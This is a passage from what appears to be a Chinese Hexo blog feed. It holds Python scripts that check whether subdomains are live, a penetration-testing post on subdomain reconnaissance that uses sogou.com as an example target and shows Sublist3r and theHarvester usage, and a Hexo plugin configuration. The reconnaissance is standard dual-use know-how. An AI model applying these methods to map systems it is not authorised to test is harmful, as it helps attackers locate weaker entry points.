class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threadpool</span><br><span class="line">domain_sucess = []</span><br><span class="line">def URLIP(url):</span><br><span class="line">    port = [80,443]</span><br><span class="line">    for i in port:</span><br><span class="line">        url1 = &quot;http://%s:%s&quot;%(url,i)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url1,timeout=4)</span><br><span class="line">            print(url1 + &quot;:&quot; + &quot;存活&quot;)</span><br><span class="line">            domain_sucess.append(url1)</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    domain = []</span><br><span class="line">    with open(&apos;test3.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            domain.append(i.strip())</span><br><span class="line">        f.close()</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    pool = threadpool.ThreadPool(100)</span><br><span class="line">    requests_1 = threadpool.makeRequests(URLIP,domain)</span><br><span class="line">    [pool.putRequest(req) for req in requests_1]</span><br><span class="line">    pool.wait()</span><br><span class="line">    print(&apos;%d second&apos; % (time.time() - start_time))</span><br><span class="line">    print(domain_sucess)</span><br></pre></td></tr></table></figure><blockquote><p>multiprocessing进程池</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import multiprocessing</span><br><span class="line">domain_sucess = []</span><br><span class="line">def URLIP(url):</span><br><span class="line">    port = [80,443]</span><br><span class="line">    for i in port:</span><br><span class="line">        url1 = &quot;http://%s:%s&quot;%(url,i)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url1,timeout=4)</span><br><span class="line">            print(url1 + &quot;:&quot; + &quot;存活&quot;)</span><br><span class="line">            domain_sucess.append(url1)</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    domain = []</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    pool = multiprocessing.Pool(100)</span><br><span class="line">    with open(&apos;test3.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            pool.apply_async(URLIP, (i.strip(),))</span><br><span class="line">        f.close()</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(&apos;%d second&apos; % (time.time() - start_time))</span><br><span class="line">    print(domain_sucess)</span><br></pre></td></tr></table></figure><blockquote><p>asyncio or aiohttp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line">import time</span><br><span class="line">cunhuadomain = []</span><br><span class="line">async def URLCUNHUA(url):</span><br><span class="line">    ports = [80,443]</span><br><span class="line">    for port in ports:</span><br><span class="line">        url1 = &apos;http://&apos; + url + &quot;:&quot; + str(port)</span><br><span class="line">        try:</span><br><span class="line">            async with aiohttp.ClientSession() as session:</span><br><span class="line">                async with session.get(url1) as r:</span><br><span class="line">                    cunhuadomain.append(url1)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    start = time.time()</span><br><span class="line">    tasks = []</span><br><span class="line">    with open(&apos;test3.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            tasks.append(URLCUNHUA(i.strip()))</span><br><span class="line">        f.close()</span><br><span class="line">    event_loop = asyncio.get_event_loop()</span><br><span class="line">    results = event_loop.run_until_complete(asyncio.gather(*tasks))</span><br><span class="line">    event_loop.close()</span><br><span class="line">    with open(&apos;test4.txt&apos;,&apos;w+&apos;) as f:</span><br><span class="line">        for i in cunhuadomain:</span><br><span class="line">            f.write(i.strip + &apos;\n&apos;)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(end - start)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;通过threading.Semaphore控制最大线程数量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="Python" scheme="https://my0tang.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://my0tang.github.io/tags/Python/"/>
    
      <category term="子域名" scheme="https://my0tang.github.io/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>子域名收集记录</title>
    <link href="https://my0tang.github.io/2019/04/04/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E8%AE%B0%E5%BD%95-1/"/>
    <id>https://my0tang.github.io/2019/04/04/子域名收集记录-1/</id>
    <published>2019-04-04T14:36:00.000Z</published>
    <updated>2019-04-07T11:12:36.648Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试中，信息搜集能力的差距，不明显，也最明显</p><p>在对目标网络进行渗透时，除了收集端口、域名、对外提供服务等信息外，其子域名信息收集是非常重要的一步，相对主站，分站的安全防范会弱一些，因此通过收集子域名信息来进行渗透是目前常见的一种手法。子域名信息收集可以通过手工，也可以通过工具，还可以通过普通及漏洞搜索引擎来进行分析。在挖SRC漏洞时，子域名信息的收集至关重要！ </p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>工具:<a href="https://github.com/bit4woo/domain_hunter" target="_blank" rel="noopener">Burp Suite Extender</a></p><p><img src="/images/子域名收集/12.jpg" alt></p><h1 id="反查whois"><a href="#反查whois" class="headerlink" title="反查whois"></a>反查whois</h1><p>工具：站长工具</p><p>1 查询whois <a href="http://whois.chinaz.com/sogou.com" target="_blank" rel="noopener">http://whois.chinaz.com/sogou.com</a><br><img src="/images/子域名收集/1.jpg" alt><br>2 反查whois <a href="http://whois.chinaz.com/reverse?host=domainmaster@sogoucom.&amp;ddlSearchMode=1" target="_blank" rel="noopener">http://whois.chinaz.com/reverse?host=domainmaster@sogoucom.&amp;ddlSearchMode=1</a> 可以通过邮箱反查，也可以通过联系电话反查，但是由于各种原因(因为我懒，所以没去找联系邮箱，联系电话真实的域名)，所以就拿这个域名注册商做例子了<br><img src="/images/子域名收集/2.jpg" alt></p><h1 id="通过备案反查"><a href="#通过备案反查" class="headerlink" title="通过备案反查"></a>通过备案反查</h1><ol><li>通过 <a href="http://icp.chinaz.com/www.sougou.com" target="_blank" rel="noopener">http://icp.chinaz.com/www.sougou.com</a> 查询网站的备案<br><img src="/images/子域名收集/3.jpg" alt></li><li><a href="http://icp.chinaz.com/%E4%BA%ACICP%E5%A4%8711001839%E5%8F%B7" target="_blank" rel="noopener">http://icp.chinaz.com/%E4%BA%ACICP%E5%A4%8711001839%E5%8F%B7</a><br><img src="/images/子域名收集/4.jpg" alt><br>ps:还可以通过主办单位去获取子域名</li></ol><h1 id="通过搜索引擎高级语法"><a href="#通过搜索引擎高级语法" class="headerlink" title="通过搜索引擎高级语法"></a>通过搜索引擎高级语法</h1><p>搜索推荐工具：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a>   <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a></p><p>Sublist3r</p><p>Sublist3r是一个python版工具，其设计原理是基于通过使用搜索引擎，从而对站点子域名进行列举。</p><p>在应用上，它可以帮助渗透测试人员以及漏洞检测人员针对他们的目标域名收集以及获取其子域名。Sublist3r目前支持以下搜索引擎：Google, Yahoo, Bing, 百度以及Ask，而未来将支持更多的搜索引擎。目前，Sublist3r同样也通过Netcraft以及DNSdumpster获取子域名。</p><p>而子域名爆破工具subbrute也被融入到Sublist3r中，主要是通过利用bruteforce强大的字典来获取更多子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Sublist3r# python3 sublist3r.py --help</span><br><span class="line">usage: sublist3r.py [-h] -d DOMAIN [-b [BRUTEFORCE]] [-p PORTS] [-v [VERBOSE]]</span><br><span class="line">                    [-t THREADS] [-e ENGINES] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -d DOMAIN, --domain DOMAIN</span><br><span class="line">                        Domain name to enumerate it&apos;s subdomains</span><br><span class="line">  -b [BRUTEFORCE], --bruteforce [BRUTEFORCE]</span><br><span class="line">                        Enable the subbrute bruteforce module</span><br><span class="line">  -p PORTS, --ports PORTS</span><br><span class="line">                        Scan the found subdomains against specified tcp ports</span><br><span class="line">  -v [VERBOSE], --verbose [VERBOSE]</span><br><span class="line">                        Enable Verbosity and display results in realtime</span><br><span class="line">  -t THREADS, --threads THREADS</span><br><span class="line">                        Number of threads to use for subbrute bruteforce</span><br><span class="line">  -e ENGINES, --engines ENGINES</span><br><span class="line">                        Specify a comma-separated list of search engines</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Save the results to text file</span><br><span class="line"></span><br><span class="line">Example: python sublist3r.py -d google.com</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">－d：枚举指定域名的子域名</span><br><span class="line">－b：使用subbrute模块</span><br><span class="line">－v：实时列举搜索结果</span><br><span class="line">－t：设置使用subbrute暴力破解的线程数</span><br><span class="line">－o：将结果保存为文本文件</span><br><span class="line">－h：帮助</span><br></pre></td></tr></table></figure><p>例子:python3 sublist3r.py -d sogou.com -b -t 50 -p 80,443,8080 -v</p><p>TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。这些信息将在后期的渗透测试阶段发挥巨大的作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# theharvester -h</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">*                                                                 *</span><br><span class="line">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span><br><span class="line">* | __| &apos;_ \ / _ \  / /_/ / _` | &apos;__\ \ / / _ \/ __| __/ _ \ &apos;__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* TheHarvester Ver. 2.6                                           *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Usage: theharvester options </span><br><span class="line"></span><br><span class="line">       -d: Domain to search or company name #要搜索的域名</span><br><span class="line">       -b: data source: google, googleCSE, bing, bingapi, pgp #指定搜索引擎或社交媒体</span><br><span class="line">                        linkedin, google-profiles, people123, jigsaw, </span><br><span class="line">                        twitter, googleplus, all</span><br><span class="line"></span><br><span class="line">       -s: Start in result number X (default: 0)</span><br><span class="line">       -v: Verify host name via dns resolution and search for virtual hosts #通过DNS解析验证主机名并搜索虚拟主机</span><br><span class="line">       -f: Save the results into an HTML and XML file                          #保存文件</span><br><span class="line">       -n: Perform a DNS reverse query on all ranges discovered #对发现的所有范围执行DNS反向查询</span><br><span class="line">       -c: Perform a DNS brute force for the domain name</span><br><span class="line">       -t: Perform a DNS TLD expansion discovery</span><br><span class="line">       -e: Use this DNS server</span><br><span class="line">       -l: Limit the number of results to work with(bing goes from 50 to 50 results,#限制搜索结果数，默认每次并发为50</span><br><span class="line">       -h: use SHODAN database to query discovered hosts</span><br><span class="line">            google 100 to 100, and pgp doesn&apos;t use this option)</span><br><span class="line"></span><br><span class="line">Examples:                                #例子</span><br><span class="line">        theharvester -d microsoft.com -l 500 -b google</span><br><span class="line">        theharvester -d microsoft.com -b pgp</span><br><span class="line">        theharvester -d microsoft -l 200 -b linkedin</span><br><span class="line">        theharvester -d apple.com -b googleCSE -l 500 -s 300</span><br></pre></td></tr></table></figure></p><p>示例:theHarvester -d sogou.com -l 500 -b baidu -f sogou.html<br><img src="/images/子域名收集/5.jpg" alt></p><h1 id="通过证书获取"><a href="#通过证书获取" class="headerlink" title="通过证书获取"></a>通过证书获取</h1><p><a href="https://www.censys.io/certificates?q=sogou.com" target="_blank" rel="noopener">https://www.censys.io/certificates?q=sogou.com</a><br><img src="/images/子域名收集/7.jpg" alt><br><img src="/images/子域名收集/8.jpg" alt><br><img src="/images/子域名收集/9.jpg" alt><br><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></p><p><img src="/images/子域名收集/6.jpg" alt><br>谷歌也提供了证书搜索的功能，不过需要翻墙，大家自行搜索吧。</p><h1 id="利用文件信息泄漏"><a href="#利用文件信息泄漏" class="headerlink" title="利用文件信息泄漏"></a>利用文件信息泄漏</h1><p>1 crossdomain.xml 文件<br><img src="/images/子域名收集/10.jpg" alt></p><h1 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h1><p>工具:subDomainsBrute  wydomain 当然还有windows上的Layer子域名挖掘机</p><h1 id="一个比较好的域名挖掘工具"><a href="#一个比较好的域名挖掘工具" class="headerlink" title="一个比较好的域名挖掘工具"></a>一个比较好的域名挖掘工具</h1><p>工具:<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a></p><p>需要的Python库:<br><code>python -m pip install pymongo requests dnspython threadpool queue selenium BeautifulSoup4</code></p><h1 id="常用网站总结"><a href="#常用网站总结" class="headerlink" title="常用网站总结:"></a>常用网站总结:</h1><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>  站长之家的whois查询</p><p><a href="http://icp.chinaz.com/" target="_blank" rel="noopener">http://icp.chinaz.com/</a> 备案查询</p><p><a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a> 证书查询</p><p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a> 证书查询</p><p><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a> 通过Google的证书查询</p><p><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a>  证书查询</p><p><a href="https://hackertarget.com/find-dns-host-records/" target="_blank" rel="noopener">https://hackertarget.com/find-dns-host-records/</a>  挺不错的一个查询网站</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>域名收集的方式千千万，别人写的开源工具也很多，但是用起来毕竟不是那么的顺手，所以大家完全可以自己开发，集大家之所长，开发属于自己的域名获取工具</p><p><img src="/images/子域名收集/11.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试中，信息搜集能力的差距，不明显，也最明显&lt;/p&gt;
&lt;p&gt;在对目标网络进行渗透时，除了收集端口、域名、对外提供服务等信息外，其子域名信息收集是非常重要的一步，相对主站，分站的安全防范会弱一些，因此通过收集子域名信息来进行渗透是目前常见的一种手法。子域名信息收集可以通
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://my0tang.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息收集" scheme="https://my0tang.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 博客 Next主题配置字数统计，阅读时长</title>
    <link href="https://my0tang.github.io/2019/03/31/test/"/>
    <id>https://my0tang.github.io/2019/03/31/test/</id>
    <published>2019-03-31T10:57:00.000Z</published>
    <updated>2019-03-31T10:58:15.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="插件地址"><a href="#插件地址" class="headerlink" title="插件地址"></a>插件地址</h1><p>地址:<a href="https://github.com/theme-next/hexo-symbols-count-time" target="_blank" rel="noopener">hexo-symbols-count-time</a></p><h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><p>进入 hexo 博客根目录，使用以下命令安装<code>hexo-symbols-count-time</code>插件：</p><p><code>$ npm install hexo-symbols-count-time --save</code></p><h1 id="配置-config-yml-文件"><a href="#配置-config-yml-文件" class="headerlink" title="配置 _config.yml 文件"></a>配置 _config.yml 文件</h1><p>配置内容可以直接配置在 Hexo 的配置文件 <code>_config.yml</code> 中,在最底下加上如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br></pre></td></tr></table></figure></p><h1 id="配置Next主题下的-config-yml-文件"><a href="#配置Next主题下的-config-yml-文件" class="headerlink" title="配置Next主题下的_config.yml 文件"></a>配置Next主题下的_config.yml 文件</h1><p>此插件集成在«NexT»中，在主要Hexo配置中启用插件后，您可以调整NexT配置中的选项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_post: true</span><br><span class="line">  item_text_total: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;插件地址&quot;&gt;&lt;a href=&quot;#插件地址&quot; class=&quot;headerlink&quot; title=&quot;插件地址&quot;&gt;&lt;/a&gt;插件地址&lt;/h1&gt;&lt;p&gt;地址:&lt;a href=&quot;https://github.com/theme-next/hexo-symbols-count-t
      
    
    </summary>
    
      <category term="Hexo" scheme="https://my0tang.github.io/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="https://my0tang.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
